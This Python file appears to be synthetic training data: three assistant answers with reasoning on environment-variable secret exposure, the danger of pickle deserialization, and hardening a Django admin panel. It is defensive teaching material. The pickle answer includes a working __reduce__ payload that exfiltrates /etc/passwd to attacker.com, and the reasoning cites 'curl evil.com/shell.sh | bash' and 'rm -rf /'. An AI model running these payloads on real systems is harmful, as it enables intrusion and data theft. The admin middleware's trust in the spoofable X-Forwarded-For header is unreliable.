"""Phase 2B: Advanced Reasoning — Adversarial Self-Testing (Part 8/8)"""

PAIRS = [
    (
        "thinking/adversarial-environment-variable-injection",
        "We pass configuration via environment variables in our Docker containers. Someone said this could be a security risk. Our env vars include database credentials, API keys, and feature flags. What's the actual threat?",
        r'''<think>
Environment variable security — let me think about the attack surface.

**How env vars get exposed:**

1. **Process listing**: On Linux, any process can read another process's environment via `/proc/<pid>/environ`. If an attacker gets code execution (even limited), they can read ALL env vars.

2. **Docker inspect**: `docker inspect <container>` shows all env vars in plaintext. Anyone with Docker socket access sees everything.

3. **Crash dumps and core files**: Env vars are in process memory. Crash dumps capture them.

4. **Logging**: Libraries may log env vars at startup for debugging. `env` or `printenv` in a debug endpoint.

5. **Child processes**: Env vars are inherited by ALL child processes (subprocess, exec). If you spawn a process, it gets all your secrets.

6. **Container orchestration**: In Kubernetes, env vars are visible in pod specs, etcd (unless using Secrets), and the Kubernetes API.

7. **Docker Compose files**: `docker-compose.yml` with env vars is committed to source control.

8. **CI/CD logs**: Build systems may echo env vars during setup.

**Severity assessment:**
The threat is real but often overstated. Env vars are the STANDARD way to pass secrets in containerized environments (12-factor app). The risk isn't in using env vars — it's in how you PROTECT them.

For most applications, env vars are acceptable with proper safeguards. For highly sensitive workloads (PCI, SOC2), use a secrets manager.

Let me provide both the risks and practical mitigations.
</think>

The risk is real but manageable. Environment variables are exposed through more channels than most developers realize. Here's the full threat model:

## How Env Vars Get Exposed

### 1. Process Listing (Any Code Execution)
```bash
# ANY process on the same system can read your env vars
cat /proc/1/environ | tr '\0' '\n'
# Output: DATABASE_URL=postgres://user:password@host/db
#         STRIPE_KEY=sk_live_abc123...

# Even a limited shell (e.g., from an SSRF exploit) can do this
```

### 2. Docker Inspect
```bash
# Anyone with Docker socket access sees everything
docker inspect my-container | jq '.[0].Config.Env'
# [
#   "DATABASE_URL=postgres://user:password@host/db",
#   "STRIPE_KEY=sk_live_abc123",
#   "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG..."
# ]
```

### 3. Kubernetes Pod Specs
```bash
# Env vars in pod specs are stored in etcd (often unencrypted)
kubectl get pod my-pod -o json | jq '.spec.containers[0].env'
# Shows all env vars in plaintext
```

### 4. Application Logging
```python
# ❌ Common mistake: logging all env vars at startup
import os
logger.info("Starting with config: %s", dict(os.environ))
# Now your Stripe key is in CloudWatch/Datadog/Splunk

# ❌ Framework debug pages show env vars
# Django debug page, Flask debugger, etc.
# NEVER run with DEBUG=True in production
```

### 5. Child Process Inheritance
```python
# ❌ Every subprocess inherits ALL env vars
import subprocess
subprocess.run(["some-tool", "--flag"])
# some-tool now has access to DATABASE_URL, STRIPE_KEY, etc.

# ✅ FIX: explicitly pass only needed env vars
subprocess.run(["some-tool"], env={"PATH": os.environ["PATH"]})
```

## Mitigation Strategy

### Level 1: Basic Hygiene (Do Today)

```yaml
# ❌ NEVER put secrets in docker-compose.yml (committed to git)
services:
  app:
    environment:
      - DATABASE_URL=postgres://user:password@db/myapp  # IN SOURCE CONTROL!

# ✅ Use .env files (not committed) or env_file
services:
  app:
    env_file: .env  # NOT committed to git
```

```python
# ❌ Don't log environment variables
# ✅ Sanitize if you must log config
SAFE_TO_LOG = {"APP_ENV", "LOG_LEVEL", "PORT", "WORKERS"}
config_log = {k: v for k, v in os.environ.items() if k in SAFE_TO_LOG}
logger.info("Starting with config: %s", config_log)
```

### Level 2: Docker Secrets (For Docker Swarm / Compose)

```yaml
# Docker secrets are mounted as files, not env vars
# Not visible in docker inspect, not in process /proc/environ

services:
  app:
    secrets:
      - db_password
      - stripe_key
    environment:
      - APP_ENV=production  # Non-sensitive config stays as env var

secrets:
  db_password:
    file: ./secrets/db_password.txt
  stripe_key:
    file: ./secrets/stripe_key.txt
```

```python
# Read secrets from files instead of env vars
def read_secret(name: str) -> str:
    """Read a Docker secret mounted as a file."""
    secret_path = f"/run/secrets/{name}"
    with open(secret_path) as f:
        return f.read().strip()

DATABASE_PASSWORD = read_secret("db_password")
STRIPE_KEY = read_secret("stripe_key")
```

### Level 3: Kubernetes Secrets

```yaml
# Use Kubernetes Secrets (base64 encoded in etcd)
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  database-url: cG9zdGdyZXM6Ly91c2VyOnBhc3NAaG9zdC9kYg==  # base64
  stripe-key: c2tfbGl2ZV9hYmMxMjM=

---
# Mount as files, NOT env vars
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
        - name: app
          volumeMounts:
            - name: secrets
              mountPath: /etc/secrets
              readOnly: true
      volumes:
        - name: secrets
          secret:
            secretName: app-secrets
```

## Practical Recommendation

| Sensitivity | Approach |
|-------------|----------|
| Feature flags, log level, port | Environment variables (fine) |
| API keys for non-financial services | Env vars with proper hygiene |
| Database credentials | Docker/K8s secrets (file-mounted) |
| Payment keys, encryption keys | Secrets manager (Vault, AWS Secrets Manager) |

For most startups and small teams, environment variables with proper hygiene (not in source control, not logged, not in debug pages) are sufficient. Upgrade to a secrets manager when compliance or scale demands it.'''
    ),
    (
        "thinking/adversarial-deserialization-attack",
        "We have a Python API that accepts pickled objects from trusted internal services. A security auditor flagged this as critical. Is pickle really that dangerous if it's internal?",
        r'''<think>
Pickle deserialization from "trusted" internal services. This is a well-known critical vulnerability. Let me analyze.

**Why pickle is dangerous:**
`pickle.loads()` can execute ARBITRARY CODE during deserialization. Not just instantiate objects — literally run any Python code, including:
- `os.system("rm -rf /")`
- `subprocess.Popen(["curl", "evil.com/shell.sh", "|", "bash"])`
- Reverse shells, data exfiltration, anything

This is by DESIGN — pickle needs to reconstruct Python objects, which means calling constructors, __reduce__ methods, etc.

**The "trusted internal" argument:**
"Only internal services send us pickled data, so it's safe."

Problems with this argument:
1. **Supply chain**: If ANY internal service is compromised, they can send malicious pickles
2. **SSRF**: An SSRF vulnerability in any service could be used to send crafted pickles to your endpoint
3. **Network access**: Anyone on the internal network can send traffic to internal endpoints
4. **Man-in-the-middle**: Unencrypted internal traffic can be intercepted and modified
5. **Future changes**: Today it's internal; tomorrow someone adds an external integration that touches this endpoint
6. **Defense in depth**: Security shouldn't rely on a single trust boundary

**The auditor is correct.** Pickle deserialization from ANY untrusted or semi-trusted source is a critical vulnerability. "Internal" is not a sufficient trust level for arbitrary code execution.

**Alternatives:**
- JSON (safe, no code execution)
- MessagePack (fast binary, safe)
- Protocol Buffers (schema-enforced, safe)
- If you MUST serialize Python objects: `jsonpickle` with restrictions, or custom serializers
</think>

The auditor is correct — this is a **critical vulnerability** regardless of it being internal. Pickle deserialization = arbitrary code execution.

## The Danger: Live Demo

```python
import pickle
import os

# This is a valid pickle payload that executes shell commands
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/exfil?data=$(cat /etc/passwd)",))

# Serializing this creates a normal-looking pickle
malicious_data = pickle.dumps(Exploit())

# When your API deserializes it:
pickle.loads(malicious_data)
# → Executes: curl attacker.com/exfil?data=<your password file>
# → Attacker has your /etc/passwd
# → Could be: rm -rf /, reverse shell, crypto miner, anything
```

## Why "Internal Only" Doesn't Help

```
Your argument: "Only trusted internal services send pickled data"

Reality:
1. Service A has an SSRF bug → attacker sends crafted pickle through A
2. Developer's laptop on the VPN → malware sends pickle to internal endpoint
3. Compromised CI/CD → build process sends malicious pickle
4. Container escape → attacker on the network sends directly
5. Log4Shell-style vuln in ANY service → pivot to your pickle endpoint

"Internal network" is NOT a security boundary.
It's a SINGLE LAYER that, when breached, gives access to everything.
```

## The Fix: Replace Pickle

```python
# ❌ CRITICAL VULNERABILITY
import pickle

@app.route('/api/process', methods=['POST'])
def process():
    data = pickle.loads(request.data)  # Arbitrary code execution
    return handle(data)


# ✅ SAFE: Use JSON
import json

@app.route('/api/process', methods=['POST'])
def process():
    data = json.loads(request.data)  # Can only create dicts, lists, strings, numbers
    return handle(data)


# ✅ SAFE: Use MessagePack (faster than JSON, binary format)
import msgpack

@app.route('/api/process', methods=['POST'])
def process():
    data = msgpack.unpackb(request.data, raw=False)
    return handle(data)


# ✅ SAFE: Use Protocol Buffers (schema-enforced)
from myapp.proto import event_pb2

@app.route('/api/process', methods=['POST'])
def process():
    event = event_pb2.Event()
    event.ParseFromString(request.data)
    return handle(event)
```

## If You Absolutely Need Complex Python Objects

```python
# ✅ Custom serialization with explicit type handling
import json
from dataclasses import dataclass, asdict
from datetime import datetime

@dataclass
class Event:
    event_type: str
    user_id: int
    timestamp: str
    data: dict

def serialize_event(event: Event) -> bytes:
    return json.dumps(asdict(event)).encode()

def deserialize_event(raw: bytes) -> Event:
    d = json.loads(raw)
    # Explicitly construct — no arbitrary code execution possible
    return Event(
        event_type=str(d["event_type"]),
        user_id=int(d["user_id"]),
        timestamp=str(d["timestamp"]),
        data=dict(d.get("data", {})),
    )
```

## Migration Plan

```python
# Step 1: Add JSON support alongside pickle (backward compatible)
@app.route('/api/process', methods=['POST'])
def process():
    content_type = request.headers.get('Content-Type', '')
    if 'application/json' in content_type:
        data = json.loads(request.data)
    elif 'application/x-pickle' in content_type:
        # Log a deprecation warning
        logger.warning("Pickle deserialization used by %s — migrate to JSON",
                      request.remote_addr)
        data = pickle.loads(request.data)  # Temporary
    else:
        abort(415, "Use application/json")
    return handle(data)

# Step 2: Update all internal services to send JSON
# Step 3: Remove pickle support entirely
# Step 4: Add to security policy: "No pickle deserialization, ever"
```

The rule: **never deserialize untrusted data with pickle, yaml.load(), or eval()**. These all allow arbitrary code execution. Use JSON, MessagePack, or Protocol Buffers for data exchange.'''
    ),
    (
        "thinking/adversarial-admin-panel-exposure",
        "Our Django admin panel is at /admin/ in production. We have strong passwords and 2FA. Is there any remaining security concern?",
        r'''<think>
Django admin at /admin/ with strong passwords and 2FA. Let me think about remaining attack surface.

1. **URL predictability**: /admin/ is the default. Every attacker tries it first. Even with strong passwords, this gives attackers:
   - Confirmation that you use Django
   - A login form to brute force (despite rate limiting, there are distributed attacks)
   - Version information from the admin CSS/JS

2. **Public internet exposure**: If /admin/ is accessible from the internet, it's a target. Should be restricted to internal network/VPN.

3. **Session fixation/hijacking**: Admin sessions are high-value targets. If any XSS exists elsewhere on the site, admin cookies could be stolen.

4. **CSRF on admin actions**: Django admin has CSRF protection, but custom admin actions might not.

5. **Information disclosure**: The admin panel reveals your data model (table names, field names, relationships).

6. **Dependency on Django security**: If a Django admin 0-day is found, your admin is exposed.

7. **Brute force despite 2FA**: If 2FA is TOTP-based, an attacker who phishes the password + TOTP code can log in (TOTP isn't phishing-resistant).

8. **Admin action logging**: Are admin actions audited? An insider or compromised admin account can modify data without trace.

The key remaining risks: public internet exposure and the /admin/ URL being a known target.
</think>

Strong passwords + 2FA is good but not sufficient. Here are the remaining risks:

## Remaining Attack Surface

### 1. Public Internet Exposure (Highest Risk)

```
If /admin/ is accessible from the internet:
- Every automated scanner tries /admin/ by default
- Distributed brute force attacks (10,000 IPs, each tries 3 passwords)
- Zero-day in Django admin → instant exploitation worldwide

FIX: Restrict admin to internal network only
```

```nginx
# nginx: block /admin/ from the internet
location /admin/ {
    # Only allow from office IP, VPN, or internal network
    allow 10.0.0.0/8;        # Internal network
    allow 203.0.113.50;      # Office static IP
    deny all;                 # Block everyone else

    proxy_pass http://django;
}
```

```python
# Django middleware: restrict admin by IP
ADMIN_ALLOWED_IPS = ['10.0.0.0/8', '203.0.113.50']

class AdminIPRestrictionMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        if request.path.startswith('/admin/'):
            client_ip = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip()
            if not client_ip:
                client_ip = request.META.get('REMOTE_ADDR')
            if not any(ip_in_network(client_ip, net) for net in ADMIN_ALLOWED_IPS):
                return HttpResponseForbidden("Admin access denied from this IP")
        return self.get_response(request)
```

### 2. Change the URL (Low Effort, High Value)

```python
# settings.py or urls.py — don't use /admin/
urlpatterns = [
    path('manage-f8k2x9/', admin.site.urls),  # Obscure URL
    # Attackers scanning /admin/ get 404
]
# Security through obscurity alone isn't enough, but combined with
# other measures it reduces automated attack surface significantly
```

### 3. Add Audit Logging

```python
# Track every admin action for forensics
from django.contrib.admin import ModelAdmin

class AuditedModelAdmin(ModelAdmin):
    def save_model(self, request, obj, form, change):
        logger.info(
            "ADMIN ACTION: %s %s %s (id=%s) by %s from %s",
            "modified" if change else "created",
            obj.__class__.__name__,
            obj,
            obj.pk,
            request.user.email,
            request.META.get('REMOTE_ADDR'),
        )
        super().save_model(request, obj, form, change)

    def delete_model(self, request, obj):
        logger.warning(
            "ADMIN DELETE: %s %s (id=%s) by %s from %s",
            obj.__class__.__name__, obj, obj.pk,
            request.user.email, request.META.get('REMOTE_ADDR'),
        )
        super().delete_model(request, obj)
```

### 4. Rate Limit Login Attempts

```python
# pip install django-axes
INSTALLED_APPS = [
    'axes',
    # ...
]

AXES_FAILURE_LIMIT = 5       # Lock after 5 failed attempts
AXES_COOLOFF_TIME = 1        # Lock for 1 hour
AXES_LOCKOUT_PARAMETERS = ['ip_address', 'username']
```

### 5. Restrict Admin Capabilities

```python
# Don't give all staff users full admin access
# Create groups with specific permissions

from django.contrib.auth.models import Group, Permission

# Support team: can view users, can't delete
support_group = Group.objects.create(name='Support')
support_group.permissions.add(
    Permission.objects.get(codename='view_user'),
    Permission.objects.get(codename='change_user'),
    # NOT delete_user, NOT any financial model permissions
)
```

## Security Checklist

```markdown
- [x] Strong passwords
- [x] 2FA enabled
- [ ] Admin restricted to VPN/internal network
- [ ] Admin URL changed from /admin/
- [ ] Admin actions are audit-logged
- [ ] Login rate limiting (django-axes)
- [ ] Minimal permissions per admin user
- [ ] Admin session timeout (30 min idle)
- [ ] CSP headers prevent script injection
- [ ] Regular review of admin user list
```

The biggest risk is public internet exposure. Move the admin behind a VPN and the threat surface drops dramatically.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
